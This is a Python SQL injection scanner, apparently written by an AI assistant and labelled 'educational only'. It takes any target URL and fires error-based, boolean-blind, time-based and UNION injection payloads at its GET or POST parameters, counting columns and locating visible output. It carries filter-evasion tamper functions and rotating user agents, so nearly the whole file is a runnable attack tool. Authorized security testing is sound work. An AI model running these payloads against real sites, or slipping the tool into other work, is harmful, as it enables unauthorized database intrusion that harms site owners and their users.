#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLHunter 2026 Advanced Edition - Optimized Version
Educational Purpose Only - Use on Authorized Systems
Author: AI Assistant for Learning
Version: 3.0 Optimized
"""

import requests
import sys
import time
import re
import string
import random
import argparse
import json
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from functools import partial

# ========== ANSI COLORS ==========
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_PURPLE = '\033[45m'
    BG_CYAN = '\033[46m'

# ========== BANNER ==========
BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
   ███████╗ ██████╗ ██╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██║     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████╗██║   ██║██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ╚════██║██║▄▄ ██║██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ███████║╚██████╔╝███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}{Colors.BOLD}  ⚡ SQLHunter 2026 Optimized Edition ⚡{Colors.RESET}
{Colors.GREEN}   Automated SQL Injection Testing Tool{Colors.RESET}
{Colors.RED}{Colors.BOLD}  ⚠️  Educational Use Only!{Colors.RESET}
"""

# ========== LOGGING FUNCTIONS ==========
def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def log_payload(msg):
    print(f"{Colors.PURPLE}[>]{Colors.RESET} {msg}")

def log_debug(msg):
    print(f"{Colors.DIM}[~]{Colors.RESET} {msg}")

def log_critical(msg):
    print(f"{Colors.BG_RED}{Colors.WHITE}[!!!] {msg}{Colors.RESET}")

# ========== CONFIGURATION ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

TIMEOUT = 10
MAX_THREADS = 20  # Increased for performance
DELAY = 0.01  # Reduced delay
OUTPUT_DIR = "SQLHunter_Reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)

session = requests.Session()
session.headers.update({
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "*/*",
    "Connection": "keep-alive"
})

# ========== TAMPER SCRIPTS ==========
class TamperScripts:
    @staticmethod
    def space2comment(payload):
        """Replace spaces with comments"""
        return payload.replace(" ", "/**/")

    @staticmethod
    def space2plus(payload):
        """Replace spaces with plus sign"""
        return payload.replace(" ", "+")

    @staticmethod
    def random_case(payload):
        """Randomize case of keywords"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'ORDER', 'BY']
        result = payload
        for kw in keywords:
            randomized = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
            result = re.sub(kw, randomized, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def hex_encode(payload):
        """Convert to hex where possible"""
        return payload.replace("'", "0x27")

TAMPERS = {
    "space2comment": TamperScripts.space2comment,
    "space2plus": TamperScripts.space2plus,
    "random_case": TamperScripts.random_case,
    "hex_encode": TamperScripts.hex_encode,
}

# ========== HELPER FUNCTIONS ==========
def rand_agent():
    return random.choice(USER_AGENTS)

def make_request(url, method="GET", data=None, headers=None, cookies=None):
    """Make HTTP request with proper error handling"""
    try:
        if method.upper() == "GET":
            resp = session.get(url, headers=headers, cookies=cookies, timeout=TIMEOUT, allow_redirects=False)
        else:
            resp = session.post(url, data=data, headers=headers, cookies=cookies, timeout=TIMEOUT, allow_redirects=False)
        return resp
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except Exception:
        return None

def save_report(data, filename):
    """Save report to JSON file"""
    filepath = os.path.join(OUTPUT_DIR, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    log_success(f"Report saved to {filepath}")

# ========== MAIN SQLHUNTER CLASS ==========
class SQLHunter:
    def __init__(self, url, param, method="GET", data=None, tamper=None, headers=None, cookies=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data
        self.tamper = tamper
        self.custom_headers = headers
        self.cookies = cookies
        self.vulnerable = False
        self.technique = None
        self.dbms = "Unknown"
        self.col_count = 0
        self.visible_col = 0
        self.injected_payload = ""
        self.orig_value = self._get_original_value()
        self.base_resp = self._send(self.orig_value)
        self.base_len = len(self.base_resp.text) if self.base_resp else 0
        self.session_start = time.time()

    def _get_original_value(self):
        """Extract original parameter value"""
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            return params.get(self.param, ['1'])[0]
        else:
            if isinstance(self.data, str):
                try:
                    data_dict = dict(parse_qs(self.data))
                    return data_dict.get(self.param, ['1'])[0]
                except:
                    return '1'
            elif isinstance(self.data, dict):
                return str(self.data.get(self.param, '1'))
            return '1'

    def _apply_tamper(self, payload):
        """Apply tamper script if specified"""
        if self.tamper and self.tamper in TAMPERS:
            return TAMPERS[self.tamper](payload)
        return payload

    def _build_payload(self, injection):
        """Build final injection payload"""
        return self.orig_value + injection

    def _send(self, injection, use_tamper=True):
        """Send request with injection"""
        payload = self._build_payload(injection)
        if use_tamper and self.tamper:
            payload = self._apply_tamper(payload)

        log_payload(f"Testing: {payload[:100]}...")

        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            params[self.param] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            return make_request(test_url, "GET", headers=self.custom_headers, cookies=self.cookies)
        else:
            new_data = self.data.copy() if isinstance(self.data, dict) else self.data
            if isinstance(new_data, dict):
                new_data[self.param] = payload
            return make_request(self.url, "POST", data=new_data, headers=self.custom_headers, cookies=self.cookies)

    # ========== DETECTION METHODS ==========
    def detect_error_based(self):
        """Detect error-based SQL injection"""
        log_info("Testing Error-based SQL Injection...")
        payloads = [
            "'", "\"", "')", "\")", "1'", "1\"",
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' AND 1=1-- -", "' AND 1=2-- -"
        ]
        errors = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
            r"valid MySQL result", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_",
            r"Oracle.*Driver", r"SQLite.*Exception", r"Microsoft OLE DB",
            r"ODBC Driver", r"Unclosed quotation mark", r"SQL command not properly ended",
            r"you have an error in your SQL syntax"
        ]

        for pl in payloads:
            resp = self._send(pl)
            if resp:
                content = resp.text
                for err in errors:
                    if re.search(err, content, re.IGNORECASE):
                        log_success(f"Error-based SQLi found with payload: {pl}")
                        self.technique = "Error-based"
                        self.vulnerable = True
                        self.injected_payload = pl
                        return True
                if resp.status_code == 500:
                    log_success(f"Error-based SQLi (500) with payload: {pl}")
                    self.technique = "Error-based"
                    self.vulnerable = True
                    self.injected_payload = pl
                    return True
            time.sleep(DELAY)
        return False

    def detect_boolean_blind(self):
        """Detect boolean-based blind SQL injection"""
        log_info("Testing Boolean-based Blind SQL Injection...")
        true_payload = " AND 1=1-- -"
        false_payload = " AND 1=2-- -"

        resp_true = self._send(true_payload)
        resp_false = self._send(false_payload)

        if resp_true and resp_false:
            len_true = len(resp_true.text)
            len_false = len(resp_false.text)

            if abs(len_true - len_false) > 50:
                log_success(f"Boolean-based blind SQLi found (length diff: {abs(len_true - len_false)})")
                self.technique = "Boolean-based blind"
                self.vulnerable = True
                return True

            if resp_true.text != resp_false.text:
                log_success("Boolean-based blind SQLi found (content differs)")
                self.technique = "Boolean-based blind"
                self.vulnerable = True
                return True
        return False

    def detect_time_blind(self):
        """Detect time-based blind SQL injection"""
        log_info("Testing Time-based Blind SQL Injection...")
        payloads = [
            (" AND SLEEP(3)-- -", 2.5),
            ("' AND SLEEP(3)-- -", 2.5),
            ('" AND SLEEP(3)-- -', 2.5),
        ]

        for pl, threshold in payloads:
            start = time.time()
            resp = self._send(pl)
            elapsed = time.time() - start

            if elapsed >= threshold:
                log_success(f"Time-based blind SQLi found ({elapsed:.2f}s) with: {pl}")
                self.technique = "Time-based blind"
                self.vulnerable = True
                self.injected_payload = pl
                return True
            time.sleep(DELAY)
        return False

    def detect_union(self):
        """Detect UNION-based SQL injection"""
        log_info("Testing UNION-based SQL Injection...")

        for i in range(1, 30):
            pl = f" ORDER BY {i}-- -"
            resp = self._send(pl)
            if resp and (resp.status_code == 500 or len(resp.text) != self.base_len):
                self.col_count = i - 1
                break
            time.sleep(0.01)

        if self.col_count == 0:
            return False

        log_info(f"Found {self.col_count} columns")

        for i in range(1, self.col_count + 1):
            nulls = ["NULL"] * self.col_count
            nulls[i - 1] = "CONCAT('SQLHUNTER','TEST','SQLHUNTER')"
            pl = f" UNION SELECT {','.join(nulls)}-- -"
            resp = self._send(pl)
            if resp and "SQLHUNTERTESTSQLHUNTER" in resp.text:
                self.visible_col = i
                log_success(f"UNION-based SQLi found! Visible column: {i}")
                self.technique = "UNION query"
                self.vulnerable = True
                return True
            time.sleep(0.01)

        return False

    def run_detection(self):
        """Run all detection techniques"""
        log_info(f"Testing parameter: {Colors.YELLOW}{self.param}{Colors.RESET}")

        techniques = [
            self.detect_error_based,
            self.detect_boolean_blind,
            self.detect_time_blind,
            self.detect_union
        ]

        for technique in techniques:
            if technique():
                return True

        log_error("No SQL injection vulnerability found")
        return False

# ========== MAIN FUNCTION ==========
def process_param(args, param):
    hunter = SQLHunter(
        url=args.url,
        param=param,
        method="POST" if args.data else "GET",
        data=args.data,
        tamper=args.tamper,
        cookies=args.cookie_dict if hasattr(args, 'cookie_dict') else {}
    )
    if hunter.run_detection():
        log_success(f"Vulnerable! Parameter: {param}")
        return hunter
    return None

def main():
    parser = argparse.ArgumentParser(description="SQLHunter Optimized Edition")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Parameter to test")
    parser.add_argument("--data", help="POST data (e.g., 'user=admin&pass=123')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--tamper", choices=TAMPERS.keys(), help="Tamper script to use")
    parser.add_argument("--threads", type=int, default=MAX_THREADS, help="Number of threads")

    args = parser.parse_args()

    if not args.url.startswith("http"):
        args.url = "http://" + args.url

    # Parse cookies
    args.cookie_dict = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                args.cookie_dict[key] = value

    print(BANNER)

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    params = []
    if args.param:
        params.append(args.param)
    else:
        if args.data:
            try:
                post_params = parse_qs(args.data)
                params = list(post_params.keys())
            except:
                log_error("Invalid POST data format")
                sys.exit(1)
        else:
            parsed = urlparse(args.url)
            query_params = parse_qs(parsed.query)
            params = list(query_params.keys())

    if not params:
        log_error("No parameters found. Use -p or provide URL with query string.")
        sys.exit(1)

    log_info(f"Target URL: {Colors.WHITE}{args.url}{Colors.RESET}")
    log_info(f"Parameters found: {Colors.YELLOW}{', '.join(params)}{Colors.RESET}")

    vulnerable_hunters = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_param, args, param): param for param in params}
        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerable_hunters.append(result)

    if vulnerable_hunters:
        log_success("Scan completed! Found vulnerabilities.")
    else:
        log_info("No vulnerabilities found.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        log_critical(f"Unexpected error: {e}")
        sys.exit(1)